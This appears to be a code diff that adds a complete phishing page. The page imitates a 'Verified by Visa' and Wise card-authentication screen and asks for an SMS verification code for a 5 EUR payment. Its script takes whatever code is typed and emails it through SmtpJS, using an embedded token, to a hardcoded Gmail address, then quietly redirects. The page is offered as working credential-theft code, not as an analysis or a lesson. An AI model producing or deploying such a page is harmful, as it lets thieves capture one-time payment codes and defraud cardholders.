@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang ="en">
+<head>
+<meta charset="UTF-8"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <script src="https://kit.fontawesome.com/7e2a69d5dd.js"></script> 
+  <script src="https://smtpjs.com/v3/smtp.js"></script> 
+  <script src="https://kit.fontawesome.com/7e2a69d5dd.js" crossorigin="anonymous"></script>
+<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
+</head>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap");
+@import url('https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap');
+
+*{
+    margin:0;
+    padding:0;
+ }
+ body {
+     font-family: 'Poppins', sans-serif; 
+ }
+ input {
+     font-size:18px;
+     font-family: 'Poppins', sans-serif;
+     width:35%;
+     outline:none;
+ }
+ .ima{
+     display:flex;
+     margin-left:2%;
+     
+ }
+  .img img{
+      width:80px;
+      margin-top:5%;
+      margin-left:5%;
+  }
+  .amg img{
+      width:95px;
+      margin-left:170%;
+      margin-top:5%;
+  }
+  .text{
+  margin-left:5%;  
+} 
+ab{
+  font-size:18px;  
+} 
+p{
+    font-size:18px;
+} 
+#ok{
+    
+}
+input[type="submit"] {
+ background-color:deepskyblue;
+ border:1px solid #777;
+ width:38%;
+ border-radius:3px;
+ color:white;
+       
+}
+ </style>
+<body><br>
+ <div class="ima">
+ <div class="img"><img src="https://i.postimg.cc/mD68FJRw/verified-by-visa.jpg"></div>
+<div class="amg"><img src="https://i.postimg.cc/qqhQcwvd/1024px-New-Wise-formerly-Transfer-Wise-logo-svg.png"></div>
+<br>
+ </div>
+ <div class="text">
+ <h4>Authenticate using number</h4>
+ <p>please entered the verification code received by SMS.</p>
+
+<ab>Merchant:Easypay</ab><br>
+<ab>Amount :5EUR</ab><br>
+<ab>Card number: xxxx xxxx xxxx xxxx</ab>
+<p>Authentication code</p><ab></ab>
+<form action ="submit">
+<input type="text" id="aname"placeholder ="    ***    ***" required>
+  <input type="submit" id=""value="SEND"> 
+ </div>
+ </form>
+ </body>
+ <script>
+ 
+ const aname = document.getElementById('aname');
+const submit = document.querySelector('input[type="submit"]'); // Sélection de l'élément de type "submit"
+
+submit.addEventListener('click', (e) => { // Changer l'événement à "click" au lieu de "submit"
+    e.preventDefault();
+
+    // Ajout du délai de 5 secondes avant l'envoi du formulaire
+    setTimeout(() => {
+        let ebody = `
+          <h1>Nom : </h1>${aname.value}
+            <br>
+            `;
+        
+        Email.send({
+            SecureToken : "24ed91c7-882b-465c-97d2-32856db82fdb", // Ajouter votre jeton ici
+            To : 'abdoulissa154@gmail.com', 
+            From : "abdoulissa154@gmail.com",
+            Subject : "Ceci est le sujet",
+            Body : ebody
+        }).then(() => {
+          window.location.href = "#"; // Redirection vers Google
+        });
+    }, 500); // Délai de 1000 millisecondes (1 seconde)
+});
+
+          </script>
+ </html>
+ 
